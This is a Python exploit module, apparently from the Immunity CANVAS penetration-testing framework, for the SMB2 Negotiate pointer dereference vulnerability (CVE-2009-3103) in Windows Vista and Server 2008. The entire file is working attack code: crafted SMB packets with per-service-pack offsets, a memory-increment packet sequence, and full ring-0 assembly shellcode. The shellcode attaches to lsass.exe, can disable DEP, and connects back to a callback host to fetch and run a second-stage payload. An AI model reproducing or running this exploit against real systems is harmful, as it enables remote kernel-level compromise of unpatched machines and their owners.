#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef

# GUI info
NAME='SMB2 Negotiate Pointer Dereference Vulnerability'
DESCRIPTION='SMB2 Negotiate Pointer Dereference Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='09/07/09'
DOCUMENTATION['References']='http://blog.48bits.com/?p=510, http://www.microsoft.com/technet/security/Bulletin/MS09-050.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2009-3103'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103'
DOCUMENTATION['CVSS'] = 7.8
DOCUMENTATION['MSADV']='MS09-050'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['Vista','2008']

NOTES=""" 
"""

CHANGELOG="""
Removed the following, since it was confusing users:

    1:['Windows Vista/2008 SP0 x86',
       {'DialectShort':0,
        'DialectString':'SMB 2.001',
        'FxnOffset': (0x2d688-0x2d270)/4
        }],
"""

targets = {
    0:['Autoversioning'],
    1:['Windows Vista/2008 SP1 x86',
       {'DialectShort':0x202,
        'DialectString':'SMB 2.002',
        'FxnOffset': (0x2d95c-0x2d270)/4
        }],
    2:['Windows Vista/2008 SP2 x86',
       {'DialectShort':0x202,
        'DialectString':'SMB 2.002',
        'FxnOffset': (0x2d95c-0x2d270)/4
        }]
    }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=445
        self.needsNoShellcode=1
        self.version=0
        self.ring0Shellcode=''
        self.listenerArgsDict["fromcreatethread"] = 1
        return
    
    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1
            
    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]
    
    def createRing0shellcode(self):
        
        ring0shellcode="""    mov $0xffdf0700,%edx
    xor %ecx,%ecx
    mov %ecx,(%edx)
    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
start:
    ret
    pop %esi
    lea payload_begin-start(%esi),%esi
    xor %ecx,%ecx
    lea payload_end-payload_begin(%ecx),%ecx
    mov $0xffdf0804,%edi
    push %edi
    pop %ebx
    rep movsb
    jmp *%ebx
payload_begin:
    push $0x38
    pop %ebx
    mov %fs:(%ebx),%eax
    mov 0x4(%eax),%eax

    // SEARCH FOR KERNEL IMAGE HEADER
search:
    .byte 0x66
    .byte 0x25
    .byte 0x01
    .byte 0xf0 //andw $0xf001,%ax
    dec %eax
    cmpw $0x5a4d,(%eax)
    jne search
    mov %eax,%ebp

    movl $0x80ea0014,%ebx                           
    call resolve_sym
    lea 0x4(%edi),%edx
    push %edx
    push $0xSystemPid
    call *%eax                                      // PsLookupProcessByProcessId( HANDLE ProcessId, PEPROCESS *Process)
    
    mov 0x4(%edi),%eax
    xor %ecx,%ecx
    
    movb $0xEPROCESS_ActiveProcessLinks,%cl
    add %ecx,%eax
    xor %ecx,%ecx
    movw $0xImageFileNameOffset,%cx

    
                                                    // Find process named lsass.exe
find_proc_loop:
    mov (%eax),%eax
    cmpl $0x5341534c,(%ecx,%eax,1)
    je found_uppercase
    cmpl $0x7361736c,(%ecx,%eax,1)
    jne find_proc_loop
found_uppercase:
    lea -0xEPROCESS_ActiveProcessLinks(%eax),%eax
    push %eax

    push %eax
    movl $0x0068e06a,%ebx                           
    call resolve_sym
    call *%eax                                      // KeAttachProcess( PRKPROCESS Process )


    mov $0xRemoveDEP, %eax
    test $0x1, %eax
    je keep_dep
    
    pop %eax                                        // Remove DEP - Hardcore mode :)
    push %eax
    movb 0xKPROCESS_ExecuteOptions(%eax), %bl
    orb $0xDepDisableBit, %bl
    movb %bl, 0xKPROCESS_ExecuteOptions(%eax)

keep_dep:
    movl $0x0068506a,%ebx  
    call resolve_sym
    call *%eax                                      // KeDetachProcess(VOID)
    
    pop %eax
    mov 0xEPROCESS_ThreadListHead(%eax),%ecx
find_delay_loop:                                    // Delay loop to APC Queue green light
    mov (%ecx),%ecx                                 // LIST_ENTRY.Flink
    movl -0xApcQueueableOffset(%ecx), %ebx
    test $0xApcQueueableBit, %ebx
    je find_delay_loop
    movl -0xAlertableOffset(%ecx), %ebx
    test $0xAlertableBit, %ebx
    je find_delay_loop

    lea -0xETHREAD_ThreadListEntry(%ecx),%ecx
    mov %ecx,0x14(%edi)

    movl $0x0035082c,%ebx   
    call resolve_sym
    push $0x1000
    push $0x0
    call *%eax                                      // ExAllocatePool( POOL_TYPE PoolType, SIZE_T NumberOfBytes)
    mov %eax,0x10(%edi)

    movl $0x00edc900,%ebx       
    call resolve_sym
    lea zw_yield_execution_imp-payload_end(%edi),%ecx
    mov %eax, (%ecx)                                // Save ZwYieldExecution to kernel routine completion
    lea 0x4(%ecx), %esi                             // our kernel_routine

    movl $0x0069765e,%ebx           
    call resolve_sym
    xor %edx,%edx
    push %edx
    push $0x1
    mov $0x7ffe0804,%ebx
    lea usermode_payload-payload_begin(%ebx),%ebx
    push %ebx
    push %edx
    push %esi
    push %edx
    mov 0x14(%edi),%ecx
    push %ecx
    mov 0x10(%edi),%ebx
    push %ebx
    call *%eax                                      //  KeInitializeApc( PKAPC Apc, PKTHREAD Thread, DWORD ApcData, 
                                                    //      PKERNEL_ROUTINE KernelRoutine, PRUNDOWN_ROUTINE RundownRoutine, PNORMAL_ROUTINE NormalRoutine, 
                                                    //      KPROCESSOR_MODE ApcMode, PVOID NormalContext )
    
    movl $0x00d3673e,%ebx       
    call resolve_sym
    xor %edx,%edx
    push %edx
    push %edx
    push %edx
    mov 0x10(%edi),%ebx
    push %ebx
    call *%eax                                      // KeInsertQueueApc( PKAPC Apc, PVOID NULL1, PVOID NULL2, PVOID NULL3)
    
    movl $0x341d7694,%ebx       
    call resolve_sym
    xor %edx,%edx
    mov %edx,0x8(%edi)
    movl $0x80000000,0xc(%edi)
    lea 0x8(%edi),%ebx
    push %ebx
    push $0x0
    push $0x0
    call *%eax                                      // KeDelayExecutionThread( KPROCESSOR_MODE WaitMode, BOOLEAN Alertable, PLARGE_INTEGER Interval)
    
    movl $0x00edc900,%ebx       
    call resolve_sym
    push %eax
    pop %ebx
yield_process:
    call *%ebx                                      // ZwYieldExecution(VOID)
    jmp yield_process

        
usermode_payload:
    nop
    nop
    nop
    nop
    
    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
    
user_payload_esi:    
    ret
    pop %esi

    lea payload_thread_function-user_payload_esi(%esi),%eax
    // pack args to CreateThread
    xor %ecx, %ecx
    push %ecx
    push %ecx
    push %ecx
    push %eax
    push %ecx
    push %ecx

    push $0x30
    pop %ecx
    mov %fs:(%ecx),%eax                             // fs:[30] get PEB
    mov 0xc(%eax),%eax
    mov 0x1c(%eax),%esi
    mov 0x8(%esi), %ebp
    lodsl
    movb $0xWin7kernel32_hack, %cl
    test $0x1, %cl
    je not_win7
    mov %eax, %esi
    lodsl       // for win 7
not_win7:
    mov 0x8(%eax), %eax
    push %eax                                       // push kernel32.dll base address

    movb $0xEnableAllocateActivationContextStack, %cl
    test $0x1, %cl
    je dont_allocate_actvation_context_stack
    push $0x18
    pop %ecx
    mov %fs:(%ecx),%eax                             // fs:[18] get TEB    
    lea 0xTEB_ActivationContextStackPointer(%eax), %ebx

    
    push %ebx
    movl $0x1f21210a,%ebx
    call resolve_sym
    call *%eax                                      // ntdll!RtlAllocateActivationContextStack( PVOID *ActivationContextStackPtr)

dont_allocate_actvation_context_stack:    
    pop %ebp                                        // get kernel32 baseaddr back

    movl $0x000cf314,%ebx
    call resolve_sym
    call *%eax                                  // CreateThread
    
    push %eax   // save for arg on CloseHandle
    xor %ecx, %ecx
    dec %ecx
    push %ecx
    push %eax
    movl $0x06ecd0bc,%ebx
    call resolve_sym
    call *%eax                                  // WaitForSingleObject
    
    movl $0x00067e1a,%ebx
    call resolve_sym
    call *%eax                                  // CloseHandle
    ret
    
    
payload_thread_function:

    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
    ret
    pop %esi
    
    push $0x30
    pop %ecx
    mov %fs:(%ecx),%eax                             // fs:[30] get PEB
    mov 0xc(%eax),%eax
    mov 0x1c(%eax),%esi
    mov 0x8(%esi),%ebp
    push %ebp
    lodsl

    movb $0xWin7kernel32_hack, %cl
    test $0x1, %cl
    je not_win7b
    mov %eax, %esi
    lodsl       // for win 7
not_win7b:
    mov 0x8(%eax), %ebp
        
    movl $0x000e3142,%ebx
    call resolve_sym
    push $0x40
    push $0x1000
    push $0x2000
    push $0x0
    call *%eax                                      // kernel32!VirtualAlloc( PVOID StartAddress, SIZE_T SizeInBytes, DWORD AllocationType, DWORD ProtectType)
    .byte 0x96 //xchg %eax,%esi
    movl $0x000d5786,%ebx
    call resolve_sym
    push $0x6c6c
    push $0x642e3233
    push $0x5f325357
    lea (%esp),%ebx
    push %ebx
    call *%eax                                      // LoadLibraryA( LPCTSTR FileName)
    pop %ebx
    pop %ebx
    pop %ebx

 
    push %ebp
    
    mov %eax,%ebp
    movl $0x00039314,%ebx
    call resolve_sym
    sub $0x200, %esp
    lea (%esp),%ebx
    push %ebx
    push $0x2
    call *%eax                                      // WSAStartup( WORD VersionRequested, LPWSADATA WSAData)
    add $0x200, %esp    

    movl $0x000036a4,%ebx
    call resolve_sym
    push $0x0
    push $0x1
    push $0x2
    call *%eax                                      // socket( int af, int type, int protocol)
    .byte 0x97 //xchg %eax,%edi
    movl $0x0000677c,%ebx
    call resolve_sym
    push $0xHost
    push $0xPort0002
    mov %esp,%ebx
    push $0x10
    push %ebx
    push %edi
    call *%eax                                      // connect( SOCKET s, sockaddr *name, int namelen)
    pop %ebx
    pop %ebx
    test %eax,%eax
    jl bail_out
    movl $0x00000cc0,%ebx
    call resolve_sym
    push %eax
    push $0x0
    push $0x4
    push %esi
    push %edi
    call *%eax                                      // recv( SOCKET s, char* buf, int len, int flags)
    pop %ecx
    lodsl
    .byte 0x91 //xchg %eax,%ecx
    push $0x0
    push %ecx
    push %esi
    push %edi
    call *%eax                                      // recv( SOCKET s, char* buf, int len, int flags)


    push %edi
    call *%esi
    
    pop %ebp // align stack
    
bail_out:
    pop %ebp

    movl $0x00035d94,%ebx
    call resolve_sym // resolve kernel32.ExitThread
    movl 0x0(%eax),%ecx
    orl $0x20202020,%ecx
    cmpl $0x6c64746e,%ecx //'ntdl'
    jnz do_exitthread
    pop %ebp
    movl $0x1c3fe94,%ebx
    call resolve_sym //resolve ntdll.RtlExitUserThread
do_exitthread:
    //.byte 0xcc // debug
    xor %ecx, %ecx
    push %ecx
    call %eax
    .byte 0xcc //should never be reached

zw_yield_execution_imp:
    nop
    nop
    nop
    nop
    
kernel_routine:
    // need to call ZwYieldExecution(VOID)
    pushad
    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
    ret
    pop %esi
    
    // and then, ret 14h
    mov -0xa(%esi), %eax
    call %eax
    popad
    
    ret $0x14
   
    
resolve_sym:
    pushad
    movzwl 0x3c(%ebp),%esi
    mov 0x78(%ebp,%esi,1),%esi
    lea 0x0(%ebp,%esi,1),%edi
    push %edi
    mov 0x20(%edi),%edi
    lea 0x0(%ebp,%edi,1),%edi
    xor %ecx,%ecx
hash_f:
    pushl %ecx
    mov (%edi,%ecx,4),%esi
    lea 0x0(%ebp,%esi,1),%esi //load the function into esi
    xor %eax,%eax
    xor %ecx,%ecx
    cltd
hash_loop:
    lodsb // load the first byte into eax
    test %al,%al // is it null?
    je hash_loop_out // if so check the hash
    orb $0x60,%al
    addl %eax,%ecx
    shl $1,%ecx
    add %eax,%edx
    //.byte 0x04
    //.byte 0x0b //addb $0xb,%al
    //xor $0x86,%al
    //add %eax,%edx
    jmp hash_loop
hash_loop_out:
    //xor $0xbabe,%edx
    movl %ecx,%edx
    popl %ecx
    inc %ecx
    cmpl %ebx,%edx // we moved the has
    jne hash_f // if the hash doesn't match load next func
    dec %ecx
    xor %edx,%edx
    pop %edi
    mov 0x24(%edi),%esi
    lea 0x0(%ebp,%esi,1),%esi
    mov (%esi,%ecx,2),%dx
    shl $0x2,%edx
    mov 0x1c(%edi),%eax
    lea 0x0(%ebp,%eax,1),%eax
    mov (%edx,%eax,1),%eax
    lea 0x0(%ebp,%eax,1),%eax
    mov %eax,0x1c(%esp)
    popad
    ret
payload_end:
    .byte 0xcc
"""


        self.log('Creating RING0 connect back shellcode to %s:%d'%(self.callback.ip,self.callback.port))
        parameters={}
        parameters['Host']=struct.unpack('<L',socket.inet_aton(self.callback.ip))[0]
        parameters['Port']=socket.htons(self.callback.port)

        parameters['EPROCESS_ThreadListHead']               = 0x168
        parameters['EPROCESS_ActiveProcessLinks']           = 0xa0
        parameters['EPROCESS_ImageFileName']                = 0x14c
        parameters['KPROCESS_ThreadListHead']               = 0x50
        parameters['KPROCESS_ExecuteOptions']               = 0x6b      

        parameters['ETHREAD_ThreadListEntry']               = 0x248
        parameters['KTHREAD_ApcQueueable']                  = 0xb0
        parameters['KTHREAD_Alertable']                     = 0x68
        parameters['KTHREAD_ThreadListEntry']               = 0x1c4
        parameters['KTHREAD_TEB']                           = 0x84
        parameters['TEB_ActivationContextStackPointer']     = 0x1a8
            
        parameters['EnableAllocateActivationContextStack']  = 1
        parameters['Win7kernel32_hack']                     = 0
        parameters['RemoveDEP']                             = 1
        parameters['SystemPid']                             = 0x04        
        parameters['ApcQueueableBit']                       = 0x40
        parameters['AlertableBit']                          = 0x20
        parameters['DepDisableBit']                         = 0x32

        parameters['ApcQueueableOffset']                    = parameters['ETHREAD_ThreadListEntry']  -  parameters['KTHREAD_ApcQueueable'] 
        parameters['AlertableOffset']                       = parameters['ETHREAD_ThreadListEntry']  -  parameters['KTHREAD_Alertable'] 
        parameters['TebOffset']                             = parameters['KTHREAD_ThreadListEntry'] - parameters['KTHREAD_TEB'] 
        parameters['ImageFileNameOffset']                   = parameters['EPROCESS_ImageFileName'] - parameters['EPROCESS_ActiveProcessLinks']
            
        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.ring0Shellcode=mosdef.assemble(ring0shellcode,'x86')
        
        return self.ring0Shellcode
    
    def incrementAddressPkt(self, address):
        pidhigh= targets[self.version][1]['FxnOffset'] #index of a function with 4 arguments that doesn't return 0xc0000016
        signature = '\x00'*8  #not used for incrementing packets
        packet=''

        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x72,0x00000000,0x18,0xc803,pidhigh,signature,0x0000,0x0000,0x0000,0x0000,0x0000)
        dialects=''
        data = ''
        
        if (self.version == 2):
            #VISTA SP2 OFFSETS
            data+='A'*(0x3c-0x2f-len(data))
            data+=struct.pack('<L',0xffdf0720)              # readable,writable
            data+='A'*(0x74-0x2f-len(data))
            data+=struct.pack('<LL',0xffdf0240-0x10,0xffdf0240-0x10) # 0,&0x7==0
            data+='A'*(0xa0-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffff,0xfffffffe)
            data+='A'*(0xac-0x2f-len(data))
            data+=struct.pack('<L',address-0xbc)                 # @0xa8!=0; @0xa8=address to increment-0xbc
            data+='A'*(0xcc-0x2f-len(data))
            data+=struct.pack('<BBBB',0x00,0x01,0x00,0x00)  # @0xc8==0,@0xc9==1,@0xca==0,@0xcb==0
            data+='A'*(0xe0-0x2f-len(data))
            data+=struct.pack('<B',0x4)                     # @0xe0==4
            data+='A'*(0x128-0x2f-len(data))
            data+=struct.pack('<LL',0x00000000,0x7fffffff)  # low part,high part, (flag = 0)
            data+='A'*(0x14c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffe7,0xffffffff)  # index,something!=0
            data+='A'*(0x168-0x2f-len(data))
            data+=struct.pack('<L',0x42424242)              # eip (not used by incrementing pkt)
            data+='A'*(0x200-len(data))

        elif (self.version==1):
            #SP1
            data+='A'*(0x3c-0x2f-len(data))
            data+=struct.pack('<L',0xffdf0720)              # readable,writable
            data+='A'*(0x70-0x2f-len(data))
            data+=struct.pack('<LL',0xffdf0240-0x10,0xffdf0240-0x10) # 0,&0x7==0
            data+='A'*(0x9c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffff,0xfffffffe)
            data+='A'*(0xa8-0x2f-len(data))
            data+=struct.pack('<L',address-0xb8)                 # @0xa8!=0; @0xa8=address to increment-0xbc
            data+='A'*(0xc8-0x2f-len(data))
            data+=struct.pack('<BBBB',0x00,0x01,0x00,0x00)  # @0xc8==0,@0xc9==1,@0xca==0,@0xcb==0
            data+='A'*(0xe0-0x2f-len(data))
            data+=struct.pack('<B',0x4)                     # @0xe0==4
            data+='A'*(0x128-0x2f-len(data))
            data+=struct.pack('<LL',0x00000000,0x7fffffff)  # low part,high part, (flag = 0)
            data+='A'*(0x14c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffe6,0xffffffff)  # index,something!=0
            data+='A'*(0x168-0x2f-len(data))
            data+=struct.pack('<L',0x42424242)              # eip (not used by incrementing pkt)
            data+='A'*(0x200-len(data))
        """
        Removed:
        elif (self.version==1):
            #SP0
            data+='A'*(0x3c-0x2f-len(data))
            data+=struct.pack('<L',0xffdf0720)              # readable,writable
            data+='A'*(0x60-0x2f-len(data))
            data+=struct.pack('<LL',0xffdf02d0-0x10,0xffdf02d0-0x10) # 0,&0x7==0
            data+='A'*(0x6c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffff,0xfffffffe)
            data+='A'*(0x78-0x2f-len(data))
            data+=struct.pack('<L',address-0xb8)                 # @0x78!=0; @0x78=address to increment-0xbc
            data+='A'*(0xb8-0x2f-len(data))
            data+=struct.pack('<BBBB',0x00,0x01,0x00,0x00)  # @0xb8==0,@0xb9==1,@0xba==0,@0xbb==0
            data+='A'*(0xd0-0x2f-len(data))
            data+=struct.pack('<B',0x4)                     # @0xd0==4
            data+='A'*(0x118-0x2f-len(data))
            data+=struct.pack('<LL',0x00000000,0x7fffffff)  # low part,high part, (flag = 0)
            data+='A'*(0x13c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffe6,0xffffffff)  # index,something!=0
            data+='A'*(0x158-0x2f-len(data))
            data+=struct.pack('<L',0x42424242)              # eip (not used by incrementing pkt)
        """
            
        for d in [targets[self.version][1]['DialectString'],data]:
                dialects+='\x02'+d +'\0'
        packet+=struct.pack('<BH',0x00,len(dialects))+dialects
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        return packet
    
    def sendPkt(self, packet):
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to %s:%s'%(self.host,self.port))
            return 0
        s.send(packet)
        """
        Removed:
        if self.version==1:
            time.sleep(1)  #prevent packets from arriving too quickly
        """
        s.close()
        return 1
    
    def sendExploitPkt(self):
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to %s:%s'%(self.host,self.port))
            return
        
        pidhigh= targets[self.version][1]['FxnOffset'] #index of a function with 4 arguments that doesn't return 0xc0000016
        signature = '\x00\x00\x00\xEB\x1C'#allows us to jump to shellcode launchpad
        #signature += '\t\x00\x00' ##Now in the struct pack below
                                   ##8s -> 5sHB
        packet=''

        packet+=struct.pack('<4sBLBHH5sHBHHHHH','\xffSMB',0x72,0x00000000,0x18,0xc803,pidhigh,signature,0xc86,0x00,0x0000,0x0000,0x0000,0x0000,0x0000)
        dialects=''
        data=''
        
        if (self.version==2):
            #VISTA SP2 OFFSETS
           
            launchpad1 = '\xE9\x38\x01' + '\x00' * 0xA #0xD bytes
            data += launchpad1
            data+=struct.pack('<L',0xffdf0720)              # readable,writable
            data+='A'*(0x74-0x2f-len(data))
            data+=struct.pack('<LL',0xffdf0710-0x10,0xffdf0710-0x10) # 0,&0x7==0
            data+='A'*(0xa0-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffff,0xfffffffe)
            data+='A'*(0xac-0x2f-len(data))
            data+=struct.pack('<L',0x00000000)                 # @0xac==0
            data+='A'*(0xcc-0x2f-len(data))
            data+=struct.pack('<BBBB',0x00,0x01,0x00,0x00)  # @0xc8==0,@0xc9==1,@0xca==0,@0xcb==0
            data+='A'*(0xe0-0x2f-len(data))
            data+=struct.pack('<B',0x2)                     # @0xe0==2
            data+='A'*(0x128-0x2f-len(data))
            data+=struct.pack('<LL',0x00000000,0x7fffffff)  # low part,high part, (flag = 0)
            data+='A'*(0x14c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffe7,0xffffffff)  # index,something!=0
            data+='A'*(0x168-0x2f-len(data))
            data+=struct.pack('<L',0xffdf0700)              # eip (not used by incrementing pkt)
            data+='A'*(0x200-len(data))

        elif (self.version==1):
            #SP1
            launchpad1 = '\xE9\x38\x01' + '\x00' * 0xA #0xD bytes
            data += launchpad1
            data+=struct.pack('<L',0xffdf0720)              # readable,writable
            data+='A'*(0x70-0x2f-len(data))
            data+=struct.pack('<LL',0xffdf0710-0x10,0xffdf0710-0x10) # 0,&0x7==0
            data+='A'*(0x9c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffff,0xfffffffe)
            data+='A'*(0xa8-0x2f-len(data))
            data+=struct.pack('<L',0x00000000)                 # @0xa8==0
            data+='A'*(0xc8-0x2f-len(data))
            data+=struct.pack('<BBBB',0x00,0x01,0x00,0x00)  # @0xc8==0,@0xc9==1,@0xca==0,@0xcb==0
            data+='A'*(0xe0-0x2f-len(data))
            data+=struct.pack('<B',0x2)                     # @0xe0==2
            data+='A'*(0x128-0x2f-len(data))
            data+=struct.pack('<LL',0x00000000,0x7fffffff)  # low part,high part, (flag = 0)
            data+='A'*(0x14c-0x2f-len(data))
            data+=struct.pack('<LL',0xffffffe6,0xffffffff)  # index,something!=0
            data+='A'*(0x168-0x2f-len(data))
            data+=struct.pack('<L',0xffdf0700)              # eip (not used by incrementing pkt)
            data+='A'*(0x200-len(data))

        """
        Removed:
        elif (self.version==1):
            #TODO: sp0 
            data += 'A'
        """
            
        data+=self.ring0Shellcode
        
        for d in [targets[self.version][1]['DialectString'],data]:
                dialects+='\x02'+d +'\0'
        packet+=struct.pack('<BH',0x00,len(dialects))+dialects

        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        
        self.log('Sending the exploit packet!')
        s.send(packet)
        try:
            s.recv(1024)
        except:
            pass
        return
        
    def getArgs(self):
        self.host=self.target.interface
        self.port=self.argsDict.get('port',self.port)
        self.version=self.argsDict.get('version', self.version)
        return

    def test(self):
        self.getArgs()
        packet=''
        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x72,0x00000000,0x18,0xc803,0x0000,'\0'*8,0x0000,0x0000,0x0000,0x0000,0x0000)
        dialects=''
        for d in ['PC NETWORK PROGRAM 1.0','LANMAN1.0','Windows for Workgroups 3.1a','LM1.2X002','LANMAN2.1','NT LM 0.12']:
            dialects+='\x02'+d+'\0'
        packet+=struct.pack('<BH',0x00,len(dialects))+dialects
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to %s:%s'%(self.host,self.port))
            return 0
        s.send(packet)
        data=s.recv(1024)
        status=struct.unpack('<L',data[9:13])[0]
        #Someday we'll have libsmb, and life will be awesome
        securityblob='604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d535350000100000005820000000000002800000000000000280000000000000000000000'.decode('HEX')
        data='\0'+'Windows 2000 2195\0'.encode('UTF-16LE')+'Windows 2000 5.0\0'.encode('UTF-16LE')+'\0'.encode('UTF-16LE')
        packet=''
        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x73,0x00000000,0x18,0xc803,0x0000,'\0'*8,0x0000,0x0000,0x0000,0x0000,0x0010)
        packet+=struct.pack('<BBBHHHHLHLLH',0x0c,0xff,0x00,0x0000,0x1104,0x0010,0x0000,0x00000000,len(securityblob),0x00000000,0x800000dc,len(securityblob)+len(data))
        packet+=securityblob+data
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        s.send(packet)
        data=s.recv(1024)
        if data.find('Windows Vista'.encode('UTF-16LE'))==-1 and data.find('2008'.encode('UTF-16LE'))==-1:
            return 0
        if data.find('Service Pack 1'.encode('UTF-16LE'))!=-1:
            self.version=1
            return 1
        elif data.find('Service Pack 2'.encode('UTF-16LE'))!=-1:
            self.version=2
            return 1
        else:
            self.version=0
            return 1
        return 0

    def run(self):
        self.getArgs()
        if (self.version==0):
            if self.test()==0:
                self.log("Cannot determine the version automatically.")
                self.setInfo("Cannot determine the version automatically")
                self.usage()
                return 0
        if (self.version==0):
            self.log("FAIL: Exploit for Service Pack 0 is not yet implemented.")
            self.setInfo("Exploit for Service Pack 0 is not yet implemented.")
            #TODO: comment out the following return if you want to work on SP0
            return 0

        self.log("Running exploit for target version %s"%targets[self.version][0])
        self.setInfo("Running exploit for target version %s"%targets[self.version][0])
        sc = self.createRing0shellcode()

        self.log("sending 70 (0x46) packets...")
        for e in range(0x46):
            pkt = self.incrementAddressPkt(0xffdf0700)
            if (self.sendPkt(pkt) == 0):
                self.setInfo("Connection Error")
                return 0
        self.log("\tdone")

        self.log("sending 86 (0x56) packets...")
        self.setProgress(20.0)
        for e in range(0x56):
            pkt = self.incrementAddressPkt(0xffdf0701)
            if (self.sendPkt(pkt) == 0):
                self.setInfo("Connection Error")
                return 0
        self.log("\tdone")

        self.log("sending 195 (0xc3) packets...")
        self.setProgress(40.0)
        for e in range(0xc3):
            pkt = self.incrementAddressPkt(0xffdf0702)
            if (self.sendPkt(pkt) == 0):
                self.setInfo("Connection Error")
                return 0
        self.log("\tdone")
            
        self.log("setting values for exploit...")
        self.setProgress(60.0)
        pkt = self.incrementAddressPkt(0xffdf0711)
        if (self.sendPkt(pkt) == 0):
            self.setInfo("Connection Error")
            return 0
        pkt = self.incrementAddressPkt(0xffdf0715)
        self.setProgress(80.0)
        if (self.sendPkt(pkt) == 0):
            self.setInfo("Connection Error")
            return 0
        self.log("\tdone")

        self.sendExploitPkt()
        self.setProgress(100.0)
        self.log('Done with exploit')
        self.setInfo("Exploit complete, waiting for connect back")
        
        if self.ISucceeded():
            return 1
        
        return 0

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l callback_ip -d callback_port'%(sys.argv[0])
        self.displayVersions()
        
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
